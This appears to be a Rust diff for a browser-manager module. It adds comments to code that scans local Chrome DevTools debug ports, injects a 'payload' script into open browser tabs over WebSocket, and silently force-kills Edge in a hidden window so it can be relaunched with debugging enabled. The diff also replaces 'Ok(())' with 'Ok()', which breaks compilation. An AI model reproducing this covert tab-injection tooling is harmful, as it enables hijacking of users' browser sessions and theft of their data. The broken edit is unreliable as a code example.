@@ -9,8 +9,10 @@ use std::os::windows::process::CommandExt;
 use crate::AppState;
 use crate::injector;
 
+// CDP ports to scan for browser debug interface
 const CDP_PORTS: &[u16] = &[9222, 9223, 9224];
 
+// Browser tab info from CDP /json endpoint
 #[derive(Debug, Deserialize, Clone)]
 pub struct CDPTarget {
     pub id: String,
@@ -31,7 +33,9 @@ impl BrowserManager {
         Self { cdp_port: None }
     }
     
+    // Connect to CDP - returns list of browser tabs
     pub async fn connect(&mut self) -> Option<Vec<CDPTarget>> {
+        // Try cached port first
         if let Some(port) = self.cdp_port {
             let url = format!("http://127.0.0.1:{}/json", port);
             if let Ok(resp) = reqwest::get(&url).await {
@@ -42,6 +46,7 @@ impl BrowserManager {
             self.cdp_port = None;
         }
         
+        // Scan all ports
         for port in CDP_PORTS {
             let url = format!("http://127.0.0.1:{}/json", port);
             if let Ok(resp) = reqwest::get(&url).await {
@@ -54,20 +59,22 @@ impl BrowserManager {
         None
     }
     
+    // Inject payload into a browser tab via WebSocket
     pub async fn inject(&self, target: &CDPTarget) -> Result<(), Box<dyn std::error::Error>> {
         if let Some(ws_url) = &target.ws_url {
             injector::inject(ws_url, injector::get_script()).await?;
         }
-        Ok(())
+        Ok()
     }
     
+    // Kill Edge and restart with debug port enabled
     #[cfg(windows)]
     pub fn restart_edge() -> bool {
         use std::process::Command;
         
         let _ = Command::new("taskkill")
             .args(["/F", "/IM", "msedge.exe"])
-            .creation_flags(0x08000000)
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
             .output();
         
         std::thread::sleep(std::time::Duration::from_secs(2));
